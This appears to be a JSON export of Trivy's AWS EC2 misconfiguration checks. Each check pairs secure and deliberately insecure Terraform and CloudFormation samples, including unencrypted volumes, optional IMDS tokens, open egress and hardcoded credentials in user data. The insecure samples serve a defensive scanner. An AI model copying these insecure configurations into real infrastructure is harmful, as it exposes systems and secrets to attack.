              "resource \"aws_security_group\" \"bad_example\" {\n  name        = \"http\"\n  description = \"\"\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ADD_DESCRIPTION_TO_SECURITY_GROUP_RULE",
        "title": "Add Description To Security Group Rule",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                Description: Can connect to loopback\n                IpProtocol: \"-1\"\n  bad:\n    - |-\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"-1\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule\n  good:\n    - |-\n      resource \"aws_security_group\" \"good_example\" {\n        name        = \"http\"\n        description = \"Allow inbound HTTP traffic\"\n\n        ingress {\n          description = \"HTTP from VPC\"\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_security_group\" \"bad_example\" {\n        name = \"http\"\n\n        ingress {\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n    - |-\n      resource \"aws_security_group\" \"example\" {\n        name        = \"example\"\n        description = \"example\"\n      }\n\n      resource \"aws_security_group_rule\" \"bad_example\" {\n        type              = \"egress\"\n        security_group_id = aws_security_group.example.id\n        from_port         = 443\n        to_port           = 443\n        protocol          = \"tcp\"\n      }\n",
        "file_name": "add_description_to_security_group_rule.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/add_description_to_security_group_rule.yaml",
        "local_path": "aws/ec2/add_description_to_security_group_rule.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          Description: Can connect to loopback\n          IpProtocol: \"-1\""
            ],
            "bad": [
              "Resources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"-1\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule"
            ],
            "good": [
              "resource \"aws_security_group\" \"good_example\" {\n  name        = \"http\"\n  description = \"Allow inbound HTTP traffic\"\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_security_group\" \"bad_example\" {\n  name = \"http\"\n\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}",
              "resource \"aws_security_group\" \"example\" {\n  name        = \"example\"\n  description = \"example\"\n}\n\nresource \"aws_security_group_rule\" \"bad_example\" {\n  type              = \"egress\"\n  security_group_id = aws_security_group.example.id\n  from_port         = 443\n  to_port           = 443\n  protocol          = \"tcp\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-AS_ENABLE_AT_REST_ENCRYPTION",
        "title": "As Enable At Rest Encryption",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: root\n                Ebs:\n                  Encrypted: true\n            ImageId: ami-123456\n            InstanceType: t2.small\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: root\n                Ebs:\n                  Encrypted: true\n              - DeviceName: data\n                Ebs:\n                  Encrypted: false\n            ImageId: ami-123456\n            InstanceType: t2.small\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices\n  good:\n    - |-\n      resource \"aws_launch_configuration\" \"good_example\" {\n        root_block_device {\n          encrypted = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_launch_configuration\" \"bad_example\" {\n        root_block_device {\n          encrypted = false\n        }\n      }\n",
        "file_name": "as_enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/as_enable_at_rest_encryption.yaml",
        "local_path": "aws/ec2/as_enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: root\n          Ebs:\n            Encrypted: true\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: root\n          Ebs:\n            Encrypted: true\n        - DeviceName: data\n          Ebs:\n            Encrypted: false\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices"
            ],
            "good": [
              "resource \"aws_launch_configuration\" \"good_example\" {\n  root_block_device {\n    encrypted = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_launch_configuration\" \"bad_example\" {\n  root_block_device {\n    encrypted = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-AS_ENFORCE_HTTP_TOKEN_IMDS",
        "title": "As Enforce Http Token Imds",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            MetadataOptions:\n              HttpEndpoint: enabled\n              HttpTokens: required\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            MetadataOptions:\n              HttpEndpoint: enabled\n              HttpTokens: optional\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options\n  good:\n    - |-\n      resource \"aws_launch_template\" \"good_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"required\"\n        }\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"good_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"required\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_launch_template\" \"bad_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"bad_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"optional\"\n        }\n      }\n",
        "file_name": "as_enforce_http_token_imds.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/as_enforce_http_token_imds.yaml",
        "local_path": "aws/ec2/as_enforce_http_token_imds.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      MetadataOptions:\n        HttpEndpoint: enabled\n        HttpTokens: required"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      MetadataOptions:\n        HttpEndpoint: enabled\n        HttpTokens: optional"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options"
            ],
            "good": [
              "resource \"aws_launch_template\" \"good_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}",
              "resource \"aws_launch_configuration\" \"good_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_launch_template\" \"bad_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n}",
              "resource \"aws_launch_configuration\" \"bad_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"optional\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-AS_NO_SECRETS_IN_USER_DATA",
        "title": "As No Secrets In User Data",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::LaunchTemplate\n          Properties:\n            LaunchTemplateData:\n              DisableApiTermination: true\n              IamInstanceProfile:\n                Arn:\n                  - MyIamInstanceProfile\n                  - Arn\n              ImageId: ami-04d5cc9b88example\n              InstanceType: t2.micro\n              KeyName: MyKeyPair\n              MetadataOptions:\n                - HttpTokens: required\n              SecurityGroupIds:\n                - sg-083cd3bfb8example\n              UserData: export SSM_PATH=/database/creds\n            LaunchTemplateName: MyLaunchTemplate\n\n        InstanceProfile:\n          Type: AWS::IAM::InstanceProfile\n          Properties:\n            InstanceProfileName: MyIamInstanceProfile\n            Path: /\n            Roles:\n              - MyAdminRole\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::LaunchTemplate\n          Properties:\n            LaunchTemplateData:\n              DisableApiTermination: true\n              IamInstanceProfile:\n                Arn:\n                  - MyIamInstanceProfile\n                  - Arn\n              ImageId: ami-04d5cc9b88example\n              InstanceType: t2.micro\n              KeyName: MyKeyPair\n              SecurityGroupIds:\n                - sg-083cd3bfb8example\n              UserData: export DATABASE_PASSWORD=password1234\n            LaunchTemplateName: MyLaunchTemplate\n\n        InstanceProfile:\n          Type: AWS::IAM::InstanceProfile\n          Properties:\n            InstanceProfileName: MyIamInstanceProfile\n            Path: /\n            Roles:\n              - MyAdminRole\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data\n  good:\n    - |-\n      resource \"aws_launch_template\" \"good_example\" {\n        image_id      = \"ami-12345667\"\n        instance_type = \"t2.small\"\n        user_data     = <<EOF\n      \t export GREETING=hello\n      EOF\n      }\n  bad:\n    - |-\n      resource \"aws_launch_template\" \"bad_example\" {\n        image_id      = \"ami-12345667\"\n        instance_type = \"t2.small\"\n        user_data     = <<EOF\n          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n          export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n          export AWS_DEFAULT_REGION=us-west-2\n        EOF\n      }\n",
        "file_name": "as_no_secrets_in_user_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/as_no_secrets_in_user_data.yaml",
        "local_path": "aws/ec2/as_no_secrets_in_user_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n      LaunchTemplateData:\n        DisableApiTermination: true\n        IamInstanceProfile:\n          Arn:\n            - MyIamInstanceProfile\n            - Arn\n        ImageId: ami-04d5cc9b88example\n        InstanceType: t2.micro\n        KeyName: MyKeyPair\n        MetadataOptions:\n          - HttpTokens: required\n        SecurityGroupIds:\n          - sg-083cd3bfb8example\n        UserData: export SSM_PATH=/database/creds\n      LaunchTemplateName: MyLaunchTemplate\n\n  InstanceProfile:\n    Type: AWS::IAM::InstanceProfile\n    Properties:\n      InstanceProfileName: MyIamInstanceProfile\n      Path: /\n      Roles:\n        - MyAdminRole"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n      LaunchTemplateData:\n        DisableApiTermination: true\n        IamInstanceProfile:\n          Arn:\n            - MyIamInstanceProfile\n            - Arn\n        ImageId: ami-04d5cc9b88example\n        InstanceType: t2.micro\n        KeyName: MyKeyPair\n        SecurityGroupIds:\n          - sg-083cd3bfb8example\n        UserData: export DATABASE_PASSWORD=password1234\n      LaunchTemplateName: MyLaunchTemplate\n\n  InstanceProfile:\n    Type: AWS::IAM::InstanceProfile\n    Properties:\n      InstanceProfileName: MyIamInstanceProfile\n      Path: /\n      Roles:\n        - MyAdminRole"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data"
            ],
            "good": [
              "resource \"aws_launch_template\" \"good_example\" {\n  image_id      = \"ami-12345667\"\n  instance_type = \"t2.small\"\n  user_data     = <<EOF\n\t export GREETING=hello\nEOF\n}"
            ],
            "bad": [
              "resource \"aws_launch_template\" \"bad_example\" {\n  image_id      = \"ami-12345667\"\n  instance_type = \"t2.small\"\n  user_data     = <<EOF\n    export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n    export AWS_DEFAULT_REGION=us-west-2\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  Encrypted: true\n            ImageId: ami-79fd7eee\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  Encrypted: false\n            ImageId: ami-79fd7eee\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices\n  good:\n    - |-\n      resource \"aws_instance\" \"good_example\" {\n        ami           = \"ami-7f89a64f\"\n        instance_type = \"t1.micro\"\n\n        root_block_device {\n          encrypted = true\n        }\n\n        ebs_block_device {\n          device_name = \"/dev/sdg\"\n          encrypted   = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_instance\" \"bad_example\" {\n        ami           = \"ami-7f89a64f\"\n        instance_type = \"t1.micro\"\n\n        root_block_device {\n          encrypted = false\n        }\n\n        ebs_block_device {\n          device_name = \"/dev/sdg\"\n          encrypted   = false\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/enable_at_rest_encryption.yaml",
        "local_path": "aws/ec2/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            Encrypted: true\n      ImageId: ami-79fd7eee"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            Encrypted: false\n      ImageId: ami-79fd7eee"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices"
            ],
            "good": [
              "resource \"aws_instance\" \"good_example\" {\n  ami           = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n    encrypted = true\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    encrypted   = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_instance\" \"bad_example\" {\n  ami           = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n    encrypted = false\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    encrypted   = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENABLE_VOLUME_ENCRYPTION",
        "title": "Enable Volume Encryption",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          DeletionPolicy: Snapshot\n          Type: AWS::EC2::Volume\n          Properties:\n            Encrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          DeletionPolicy: Snapshot\n          Type: AWS::EC2::Volume\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted\n  good:\n    - |-\n      resource \"aws_ebs_volume\" \"good_example\" {\n        encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_ebs_volume\" \"bad_example\" {\n        encrypted = false\n      }\n",
        "file_name": "enable_volume_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/enable_volume_encryption.yaml",
        "local_path": "aws/ec2/enable_volume_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    DeletionPolicy: Snapshot\n    Type: AWS::EC2::Volume\n    Properties:\n      Encrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    DeletionPolicy: Snapshot\n    Type: AWS::EC2::Volume"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted"
            ],
            "good": [
              "resource \"aws_ebs_volume\" \"good_example\" {\n  encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_ebs_volume\" \"bad_example\" {\n  encrypted = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Volume\n          Properties:\n            KmsKeyId: alias/volumeEncrypt\n    - |-\n      Resources:\n        MyKey:\n          Type: AWS::KMS::Key\n          Properties:\n            KeyPolicy:\n              Version: \"2012-10-17\"\n              Id: key-default-1\n\n        GoodExample:\n          Type: AWS::EC2::Volume\n          Properties:\n            KmsKeyId: !Ref MyKey\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Volume\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"ebs_encryption\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_ebs_volume\" \"example\" {\n        kms_key_id = aws_kms_key.ebs_encryption.arn\n      }\n  bad:\n    - |-\n      resource \"aws_ebs_volume\" \"example\" {}\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/encryption_customer_key.yaml",
        "local_path": "aws/ec2/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Volume\n    Properties:\n      KmsKeyId: alias/volumeEncrypt",
              "Resources:\n  MyKey:\n    Type: AWS::KMS::Key\n    Properties:\n      KeyPolicy:\n        Version: \"2012-10-17\"\n        Id: key-default-1\n\n  GoodExample:\n    Type: AWS::EC2::Volume\n    Properties:\n      KmsKeyId: !Ref MyKey"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Volume"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"ebs_encryption\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_ebs_volume\" \"example\" {\n  kms_key_id = aws_kms_key.ebs_encryption.arn\n}"
            ],
            "bad": [
              "resource \"aws_ebs_volume\" \"example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENFORCE_HTTP_TOKEN_IMDS",
        "title": "Enforce Http Token Imds",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options\n  good:\n    - |-\n      resource \"aws_instance\" \"good_example\" {\n        ami           = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"required\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_instance\" \"bad_example\" {\n        ami           = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n      }\n",
        "file_name": "enforce_http_token_imds.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/enforce_http_token_imds.yaml",
        "local_path": "aws/ec2/enforce_http_token_imds.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options"
            ],
            "good": [
              "resource \"aws_instance\" \"good_example\" {\n  ami           = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_instance\" \"bad_example\" {\n  ami           = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_DEFAULT_VPC",
        "title": "No Default Vpc",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc\n  good:\n    - |-\n      # no aws default vpc present\n      resource \"aws_vpc\" \"main\" {\n        cidr_block = \"10.0.0.0/16\"\n      }\n  bad:\n    - |-\n      resource \"aws_default_vpc\" \"default\" {\n        tags = {\n          Name = \"Default VPC\"\n        }\n      }\n",
        "file_name": "no_default_vpc.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_default_vpc.yaml",
        "local_path": "aws/ec2/no_default_vpc.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc"
            ],
            "good": [
              "# no aws default vpc present\nresource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}"
            ],
            "bad": [
              "resource \"aws_default_vpc\" \"default\" {\n  tags = {\n    Name = \"Default VPC\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_EXCESSIVE_PORT_ACCESS",
        "title": "No Excessive Port Access",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            RuleAction: allow\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            NetworkAclId: !Ref NetworkACL\n            Protocol: 6\n            Ref: NetworkACL\n            RuleAction: allow\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            RuleAction: allow\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            NetworkAclId: !Ref NetworkACL\n            Protocol: -1\n            Ref: NetworkACL\n            RuleAction: allow\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port\n  good:\n    - |-\n      resource \"aws_network_acl_rule\" \"good_example\" {\n        egress      = false\n        protocol    = \"tcp\"\n        from_port   = 22\n        to_port     = 22\n        rule_action = \"allow\"\n        cidr_block  = \"0.0.0.0/0\"\n      }\n  bad:\n    - |-\n      resource \"aws_network_acl_rule\" \"bad_example\" {\n        egress      = false\n        protocol    = \"all\"\n        rule_action = \"allow\"\n        cidr_block  = \"0.0.0.0/0\"\n      }\n",
        "file_name": "no_excessive_port_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_excessive_port_access.yaml",
        "local_path": "aws/ec2/no_excessive_port_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      RuleAction: allow\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      NetworkAclId: !Ref NetworkACL\n      Protocol: 6\n      Ref: NetworkACL\n      RuleAction: allow"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      RuleAction: allow\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      NetworkAclId: !Ref NetworkACL\n      Protocol: -1\n      Ref: NetworkACL\n      RuleAction: allow"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port"
            ],
            "good": [
              "resource \"aws_network_acl_rule\" \"good_example\" {\n  egress      = false\n  protocol    = \"tcp\"\n  from_port   = 22\n  to_port     = 22\n  rule_action = \"allow\"\n  cidr_block  = \"0.0.0.0/0\"\n}"
            ],
            "bad": [
              "resource \"aws_network_acl_rule\" \"bad_example\" {\n  egress      = false\n  protocol    = \"all\"\n  rule_action = \"allow\"\n  cidr_block  = \"0.0.0.0/0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_EGRESS_SGR",
        "title": "No Public Egress Sgr",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"6\"\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 0.0.0.0/0\n                IpProtocol: \"6\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group\n  good:\n    - |-\n      resource \"aws_security_group\" \"good_example\" {\n        egress {\n          cidr_blocks = [\"1.2.3.4/32\"]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_security_group\" \"bad_example\" {\n        egress {\n          cidr_blocks = [\"0.0.0.0/0\"]\n        }\n      }\n",
        "file_name": "no_public_egress_sgr.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_egress_sgr.yaml",
        "local_path": "aws/ec2/no_public_egress_sgr.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html"
            ],
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"6\""
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 0.0.0.0/0\n          IpProtocol: \"6\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group"
            ],
            "good": [
